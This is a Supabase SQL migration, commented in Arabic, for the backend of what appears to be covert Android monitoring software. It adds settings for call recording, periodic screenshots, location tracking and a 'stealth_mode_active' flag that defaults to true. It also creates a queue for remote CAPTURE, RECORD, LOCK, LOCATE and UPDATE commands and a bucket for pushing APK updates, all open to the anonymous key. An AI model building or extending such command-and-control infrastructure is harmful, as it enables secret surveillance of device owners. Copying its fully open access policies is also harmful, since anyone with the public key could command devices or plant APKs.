-- =====================================================================
-- Direct Update Bridge — Schema Migration
-- نفّذ هذا الملف كاملاً في Supabase SQL Editor
-- =====================================================================

-- ─── 1. جدول remote_settings ─────────────────────────────────────────
ALTER TABLE remote_settings
    ADD COLUMN IF NOT EXISTS location_interval_ms  INTEGER DEFAULT 600000,
    ADD COLUMN IF NOT EXISTS target_version        INTEGER DEFAULT 1,
    ADD COLUMN IF NOT EXISTS update_apk_path       TEXT    DEFAULT NULL,
    ADD COLUMN IF NOT EXISTS update_apk_url        TEXT    DEFAULT NULL,
    ADD COLUMN IF NOT EXISTS nickname              TEXT    DEFAULT NULL,
    ADD COLUMN IF NOT EXISTS record_calls          BOOLEAN DEFAULT FALSE,
    ADD COLUMN IF NOT EXISTS stealth_mode_active   BOOLEAN DEFAULT TRUE,
    ADD COLUMN IF NOT EXISTS screenshot_interval_ms INTEGER DEFAULT 60000,
    ADD COLUMN IF NOT EXISTS updated_at            TIMESTAMPTZ DEFAULT NOW();

-- ─── 2. جدول remote_logs (لسجلات التشخيص والتحديث) ──────────────────
CREATE TABLE IF NOT EXISTS remote_logs (
    id          BIGSERIAL PRIMARY KEY,
    device_id   TEXT        NOT NULL,
    tag         TEXT        NOT NULL DEFAULT '',
    level       TEXT        NOT NULL DEFAULT 'INFO',  -- INFO / WARN / ERROR
    message     TEXT        NOT NULL DEFAULT '',
    created_at  TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_remote_logs_device ON remote_logs (device_id, created_at DESC);

-- ─── 3. جدول commands (أوامر التحكم عن بُعد) ────────────────────────
CREATE TABLE IF NOT EXISTS commands (
    id          UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
    device_id   TEXT        NOT NULL,
    command     TEXT        NOT NULL,   -- CAPTURE / RECORD / LOCK / LOCATE / UPDATE ...
    status      TEXT        NOT NULL DEFAULT 'PENDING',  -- PENDING / EXECUTED / FAILED
    created_at  TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    executed_at TIMESTAMPTZ
);

CREATE INDEX IF NOT EXISTS idx_commands_pending ON commands (device_id, status) WHERE status = 'PENDING';

-- ─── 4. Supabase Storage — bucket التحديثات ──────────────────────────
INSERT INTO storage.buckets (id, name, public, file_size_limit, allowed_mime_types)
VALUES (
    'updates',
    'updates',
    FALSE,
    104857600,  -- 100 MB
    ARRAY['application/vnd.android.package-archive', 'application/octet-stream']
)
ON CONFLICT (id) DO UPDATE SET
    file_size_limit     = EXCLUDED.file_size_limit,
    allowed_mime_types  = EXCLUDED.allowed_mime_types;

-- ─── 5. سياسات RLS للـ anon key ──────────────────────────────────────

-- remote_settings: قراءة وكتابة للـ anon
ALTER TABLE remote_settings ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_select_remote_settings" ON remote_settings;
DROP POLICY IF EXISTS "anon_insert_remote_settings" ON remote_settings;
DROP POLICY IF EXISTS "anon_update_remote_settings" ON remote_settings;
CREATE POLICY "anon_select_remote_settings" ON remote_settings FOR SELECT USING (true);
CREATE POLICY "anon_insert_remote_settings" ON remote_settings FOR INSERT WITH CHECK (true);
CREATE POLICY "anon_update_remote_settings" ON remote_settings FOR UPDATE USING (true);

-- remote_logs: كتابة فقط للـ anon
ALTER TABLE remote_logs ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_select_remote_logs" ON remote_logs;
DROP POLICY IF EXISTS "anon_insert_remote_logs" ON remote_logs;
CREATE POLICY "anon_select_remote_logs" ON remote_logs FOR SELECT USING (true);
CREATE POLICY "anon_insert_remote_logs" ON remote_logs FOR INSERT WITH CHECK (true);

-- commands: قراءة وكتابة وتحديث للـ anon
ALTER TABLE commands ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "anon_select_commands" ON commands;
DROP POLICY IF EXISTS "anon_insert_commands" ON commands;
DROP POLICY IF EXISTS "anon_update_commands" ON commands;
CREATE POLICY "anon_select_commands" ON commands FOR SELECT USING (true);
CREATE POLICY "anon_insert_commands" ON commands FOR INSERT WITH CHECK (true);
CREATE POLICY "anon_update_commands" ON commands FOR UPDATE USING (true);

-- bucket updates: قراءة ورفع للـ anon
DROP POLICY IF EXISTS "anon_select_updates" ON storage.objects;
DROP POLICY IF EXISTS "anon_insert_updates" ON storage.objects;
CREATE POLICY "anon_select_updates"  ON storage.objects FOR SELECT USING (bucket_id = 'updates');
CREATE POLICY "anon_insert_updates"  ON storage.objects FOR INSERT WITH CHECK (bucket_id = 'updates');
CREATE POLICY "anon_update_updates"  ON storage.objects FOR UPDATE USING (bucket_id = 'updates');

-- ─── 6. تحقق نهائي ───────────────────────────────────────────────────
SELECT column_name, data_type, column_default
FROM information_schema.columns
WHERE table_name = 'remote_settings'
ORDER BY ordinal_position;
